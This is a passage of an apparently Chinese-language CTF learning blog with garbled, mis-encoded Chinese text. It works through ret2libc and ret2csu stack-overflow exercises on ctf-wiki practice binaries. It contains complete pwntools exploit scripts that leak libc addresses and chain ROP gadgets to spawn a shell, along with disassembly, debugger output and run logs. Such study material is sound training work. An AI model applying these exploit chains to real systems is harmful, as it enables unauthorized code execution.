class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(puts_plt): &quot;</span>, <span class="hljs-built_in">hex</span>(puts_plt))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(libc_start_main_got): &quot;</span>, <span class="hljs-built_in">hex</span>(libc_start_main_got))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(libc_start_main_plt): &quot;</span>, <span class="hljs-built_in">hex</span>(libc_start_main_plt))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(main): &quot;</span>, <span class="hljs-built_in">hex</span>(main))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak libc_start_main_got addr and return to main again&quot;</span>)<br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, puts_plt, main, libc_start_main_got])<br><span class="hljs-comment"># sh.sendlineafter(&#x27;Can you find it !?&#x27;, payload)</span><br>sh.sendlineafter(<span class="hljs-string">&#x27;!?&#x27;</span>, payload)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;get the related addr&quot;</span>)<br>libc_start_main_addr_raw = sh.recv(<span class="hljs-number">4</span>)<br>libc_start_main_addr = u32(libc_start_main_addr_raw) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_start_main_addr_raw: &quot;</span>, libc_start_main_addr_raw)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_start_main_addr: &quot;</span>, libc_start_main_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(libc_start_main_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(libc_start_main_addr))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)<br>libcbase = libc_start_main_addr - libc.dump(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(libcbase): &quot;</span>, <span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(system_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(binsh_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;get shell&quot;</span>)<br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">104</span>, system_addr, <span class="hljs-number">0xdeadbeef</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>kaliç³»ç»Ÿç›´æ¥è·‘ï¼Œæ²¡æœ‰è·‘å‡ºæ¥ç»“æœ</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831122757.png" alt="image.png"></p><p>æ¢äº†ä¸€ä¸ªubuntuç³»ç»Ÿï¼Œè£…äº†ä¸€ä¸ªconda(pythonä¸º3.11)ï¼Œè¯•åˆ°ç¬¬4ä¸ªï¼Œå°±æœ‰ç»“æœäº†<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831210836.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831210653.png" alt="image.png"></p><h2 id="å‚è€ƒ-2"><a href="#å‚è€ƒ-2" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/m0_64180167/article/details/130263518?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-130263518-blog-122848031.235%5Ev38%5Epc_relevant_anti_vip_base&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-130263518-blog-122848031.235%5Ev38%5Epc_relevant_anti_vip_base&utm_relevant_index=3"># CTFWIKI-PWN-ret2libc</a> è®²çš„éå¸¸è¯¦ç»†<br><a href="https://www.jianshu.com/p/5525dde00053"># pwnå­¦ä¹ ä¹‹ret2libc3â€”â€”åç§»è®¡ç®—åˆä½“éªŒ</a>   å­¦ä¹ äº†éƒ¨åˆ†æŠ€èƒ½<br><a href="https://blog.csdn.net/DSR446/article/details/99698035"># 2019.7.25 ret2libc3 å¡«å……ä»112éä¸º104</a> å­¦åˆ°äº†å¯ä»¥ç”¨setvbufè¿›è¡Œæ³„éœ²</p><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h2 id="äºŒè¿›åˆ¶ä¸‹è½½"><a href="#äºŒè¿›åˆ¶ä¸‹è½½" class="headerlink" title="äºŒè¿›åˆ¶ä¸‹è½½"></a>äºŒè¿›åˆ¶ä¸‹è½½</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5">äºŒè¿›åˆ¶ä¸‹è½½ä½ç½®</a></p><h2 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2csu]<span class="hljs-comment"># file level5</span><br>level5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=45a4cee8f6bcc184507b3bea0f0c2e2d603650bd, not stripped <br>[root@ningan ret2csu]<span class="hljs-comment">#</span><br>[root@ningan ret2csu]<span class="hljs-comment"># checksec level5</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfwiki/ret2csu/level5&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>[root@ningan ret2csu]<span class="hljs-comment">#</span><br>[root@ningan ret2csu]<span class="hljs-comment"># ./level5</span><br>Hello, World<br><span class="hljs-built_in">ls</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831161330.png" alt="image.png"></p><h2 id="æŸ¥çœ‹æ¼æ´æº¢å‡ºç‚¹"><a href="#æŸ¥çœ‹æ¼æ´æº¢å‡ºç‚¹" class="headerlink" title="æŸ¥çœ‹æ¼æ´æº¢å‡ºç‚¹"></a>æŸ¥çœ‹æ¼æ´æº¢å‡ºç‚¹</h2><p>æº¢å‡ºç‚¹ä¸ºreadå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">0xD</span>uLL);<br>  vulnerable_function();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-80h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>uLL);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831173326.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831173403.png" alt="image.png"></p><h2 id="libc-csu-initå‡½æ•°"><a href="#libc-csu-initå‡½æ•°" class="headerlink" title="__libc_csu_initå‡½æ•°"></a>__libc_csu_initå‡½æ•°</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230901120732.png" alt="image.png"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C0                               <span class="hljs-comment">; void __fastcall _libc_csu_init(unsigned int, __int64, __int64)</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C0                               public __libc_csu_init<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C0                               __libc_csu_init proc near               <span class="hljs-comment">; DATA XREF: _start+16â†‘o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C0                               <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C0 <span class="hljs-number">41</span> <span class="hljs-number">57</span>                         <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r15</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C2 <span class="hljs-number">41</span> <span class="hljs-number">56</span>                         <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C4 <span class="hljs-number">41</span> <span class="hljs-number">89</span> FF                      <span class="hljs-keyword">mov</span>     r15d, edi<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C7 <span class="hljs-number">41</span> <span class="hljs-number">55</span>                         <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>C9 <span class="hljs-number">41</span> <span class="hljs-number">54</span>                         <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r12</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>CB <span class="hljs-number">4</span>C <span class="hljs-number">8</span>D <span class="hljs-number">25</span> <span class="hljs-number">3</span>E <span class="hljs-number">08</span> <span class="hljs-number">20</span> <span class="hljs-number">00</span>          lea     <span class="hljs-built_in">r12</span>, __frame_dummy_init_array_entry<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>D2 <span class="hljs-number">55</span>                            <span class="hljs-keyword">push</span>    rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>D3 <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">2</span>D <span class="hljs-number">3</span>E <span class="hljs-number">08</span> <span class="hljs-number">20</span> <span class="hljs-number">00</span>          lea     rbp, __do_global_dtors_aux_fini_array_entry<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>DA <span class="hljs-number">53</span>                            <span class="hljs-keyword">push</span>    rbx<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>DB <span class="hljs-number">49</span> <span class="hljs-number">89</span> F6                      <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r14</span>, rsi<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>DE <span class="hljs-number">49</span> <span class="hljs-number">89</span> D5                      <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r13</span>, rdx<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005E1</span> <span class="hljs-number">4</span>C <span class="hljs-number">29</span> E5                      <span class="hljs-keyword">sub</span>     rbp, <span class="hljs-built_in">r12</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005E4</span> <span class="hljs-number">48</span> <span class="hljs-number">83</span> EC <span class="hljs-number">08</span>                   <span class="hljs-keyword">sub</span>     rsp, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005E8</span> <span class="hljs-number">48</span> C1 FD <span class="hljs-number">03</span>                   sar     rbp, <span class="hljs-number">3</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>EC E8 <span class="hljs-number">0</span>F FE FF FF                <span class="hljs-keyword">call</span>    _init_proc<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>EC<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>F1 <span class="hljs-number">48</span> <span class="hljs-number">85</span> ED                      test    rbp, rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>F4 <span class="hljs-number">74</span> <span class="hljs-number">20</span>                         jz      short loc_400616<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>F4<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>F6 <span class="hljs-number">31</span> DB                         xor     ebx, ebx<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>F8 <span class="hljs-number">0</span>F <span class="hljs-number">1</span>F <span class="hljs-number">84</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       <span class="hljs-keyword">nop</span>     dword ptr [rax+rax+<span class="hljs-number">00000000</span>h]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004005</span>F8<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400600</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400600</span>                               loc_400600:                             <span class="hljs-comment">; CODE XREF: __libc_csu_init+54â†“j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400600</span> <span class="hljs-number">4</span>C <span class="hljs-number">89</span> EA                      <span class="hljs-keyword">mov</span>     rdx, <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400603</span> <span class="hljs-number">4</span>C <span class="hljs-number">89</span> F6                      <span class="hljs-keyword">mov</span>     rsi, <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400606</span> <span class="hljs-number">44</span> <span class="hljs-number">89</span> FF                      <span class="hljs-keyword">mov</span>     edi, r15d<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400609</span> <span class="hljs-number">41</span> FF <span class="hljs-number">14</span> DC                   <span class="hljs-keyword">call</span>    ds:(__frame_dummy_init_array_entry - <span class="hljs-number">600E10</span>h)[<span class="hljs-built_in">r12</span>+rbx*<span class="hljs-number">8</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400609</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040060</span>D <span class="hljs-number">48</span> <span class="hljs-number">83</span> C3 <span class="hljs-number">01</span>                   <span class="hljs-keyword">add</span>     rbx, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400611</span> <span class="hljs-number">48</span> <span class="hljs-number">39</span> EB                      cmp     rbx, rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400614</span> <span class="hljs-number">75</span> EA                         jnz     short loc_400600<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400614</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400616</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400616</span>                               loc_400616:                             <span class="hljs-comment">; CODE XREF: __libc_csu_init+34â†‘j</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400616</span> <span class="hljs-number">48</span> <span class="hljs-number">83</span> C4 <span class="hljs-number">08</span>                   <span class="hljs-keyword">add</span>     rsp, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>A <span class="hljs-number">5</span>B                            <span class="hljs-keyword">pop</span>     rbx<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>B <span class="hljs-number">5</span>D                            <span class="hljs-keyword">pop</span>     rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>C <span class="hljs-number">41</span> <span class="hljs-number">5</span>C                         <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r12</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>E <span class="hljs-number">41</span> <span class="hljs-number">5</span>D                         <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400620</span> <span class="hljs-number">41</span> <span class="hljs-number">5</span>E                         <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400622</span> <span class="hljs-number">41</span> <span class="hljs-number">5</span>F                         <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r15</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400624</span> C3                            retn<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400624</span>                               <span class="hljs-comment">; &#125; // starts at 4005C0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400624</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400624</span>                               __libc_csu_init endp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400624</span><br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹æ¼æ´æº¢å‡ºçš„è·ç¦»"><a href="#æŸ¥çœ‹æ¼æ´æº¢å‡ºçš„è·ç¦»" class="headerlink" title="æŸ¥çœ‹æ¼æ´æº¢å‡ºçš„è·ç¦»"></a>æŸ¥çœ‹æ¼æ´æº¢å‡ºçš„è·ç¦»</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">b vulnerable_function</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">run</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">n</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">n</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">stack 20</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">distance 0x7fffffffe100 0x7fffffffe180</span><br><span class="hljs-meta prompt_">0x7fffffffe100-&gt;</span><span class="language-bash">0x7fffffffe180 is 0x80 bytes (0x10 words)</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/d 0x80</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = 128</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831173215.png" alt="image.png"></p><h2 id="ã€‚ã€‚ã€‚åæœŸè¡¥ã€‚ã€‚ã€‚"><a href="#ã€‚ã€‚ã€‚åæœŸè¡¥ã€‚ã€‚ã€‚" class="headerlink" title="ã€‚ã€‚ã€‚åæœŸè¡¥ã€‚ã€‚ã€‚"></a>ã€‚ã€‚ã€‚åæœŸè¡¥ã€‚ã€‚ã€‚</h2><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><p>ctfwikiå®˜ç½‘é¢˜è§£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs bash">from pwn import *<br>from LibcSearcher import LibcSearcher<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context(<span class="hljs-built_in">arch</span> = <span class="hljs-string">&quot;amd64&quot;</span>)<br><br>level5 = ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>sh = process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br><br>write_got = level5.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = level5.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main_addr = level5.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>bss_base = level5.bss()<br>csu_front_addr = 0x0000000000400600<br>csu_end_addr = 0x000000000040061A<br>fakeebp = b<span class="hljs-string">&#x27;b&#x27;</span> * 8<br><br><br>def csu(rbx, rbp, r12, r13, r14, r15, last):<br>    <span class="hljs-comment"># pop rbx,rbp,r12,r13,r14,r15</span><br>    <span class="hljs-comment"># rbx should be 0,</span><br>    <span class="hljs-comment"># rbp should be 1,enable not to jump</span><br>    <span class="hljs-comment"># r12 should be the function we want to call</span><br>    <span class="hljs-comment"># rdi=edi=r15d</span><br>    <span class="hljs-comment"># rsi=r14</span><br>    <span class="hljs-comment"># rdx=r13</span><br>    payload = b<span class="hljs-string">&#x27;a&#x27;</span> * 0x80 + fakeebp<br>    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(<br>        r13) + p64(r14) + p64(r15)<br>    payload += p64(csu_front_addr)<br>    payload += b<span class="hljs-string">&#x27;a&#x27;</span> * 0x38<br>    payload += p64(last)<br>    sh.send(payload)<br>    <span class="hljs-built_in">sleep</span>(1)<br><br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span><br><span class="hljs-comment">## write(1,write_got,8)</span><br>csu(0, 1, write_got, 8, write_got, 1, main_addr)<br><br>write_addr = u64(sh.recv(8))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>execve_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;execve&#x27;</span>)<br>log.success(<span class="hljs-string">&#x27;execve_addr &#x27;</span> + hex(execve_addr))<br><span class="hljs-comment">##gdb.attach(sh)</span><br><br><span class="hljs-comment">## read(0,bss_base,16)</span><br><span class="hljs-comment">## read execve_addr and /bin/sh\x00</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br>csu(0, 1, read_got, 16, bss_base, 0, main_addr)<br>sh.send(p64(execve_addr) + b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## execve(bss_base+8)</span><br>csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)<br>sh.interactive()<br><br><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">â””â”€# python exp.py</span><br><span class="hljs-string">[*] &#x27;/root/ctf-practice/ctfwiki/ret2csu/level5&#x27;</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Partial RELRO</span><br><span class="hljs-string">    Stack:    No canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      No PIE (0x400000)</span><br><span class="hljs-string">[+] Starting local process &#x27;./level5&#x27;: pid 219789</span><br><span class="hljs-string">/root/ctf-practice/ctfwiki/ret2csu/exp.py:37: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  sh.recvuntil(&#x27;Hello, World\n&#x27;)</span><br><span class="hljs-string">[+] There are multiple libc that meet current constraints :</span><br><span class="hljs-string">0 - libc6_2.7-10ubuntu3_i386</span><br><span class="hljs-string">1 - libc-2.28-206.el8.x86_64</span><br><span class="hljs-string">2 - glibc-2.28-206.el8.x86_64</span><br><span class="hljs-string">3 - glibc-2.28-208.el8.x86_64</span><br><span class="hljs-string">4 - libc-2.28-208.el8.x86_64</span><br><span class="hljs-string">5 - glibc-2.28-207.el8.x86_64</span><br><span class="hljs-string">6 - libc-2.36-22.mga9.i586</span><br><span class="hljs-string">7 - libc6_2.37-6_amd64</span><br><span class="hljs-string">8 - libc-2.28-207.el8.x86_64</span><br><span class="hljs-string">9 - libc6_2.7-10ubuntu2_i386</span><br><span class="hljs-string">[+] Choose one : 7</span><br><span class="hljs-string">[+] execve_addr 0x7fb841531060</span><br><span class="hljs-string">/root/ctf-practice/ctfwiki/ret2csu/exp.py:51: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  sh.recvuntil(&#x27;Hello, World\n&#x27;)</span><br><span class="hljs-string">/root/ctf-practice/ctfwiki/ret2csu/exp.py:55: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  sh.recvuntil(&#x27;Hello, World\n&#x27;)</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">core  exp-self.py  exp.py  exp2-test.py  exp3-test.py  level5</span><br><span class="hljs-string">$  </span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230901115410.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230901120524.png" alt="image.png"></p><h2 id="å‚è€ƒ-3"><a href="#å‚è€ƒ-3" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://wiki.mrskye.cn/Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#level-5-gadget"># 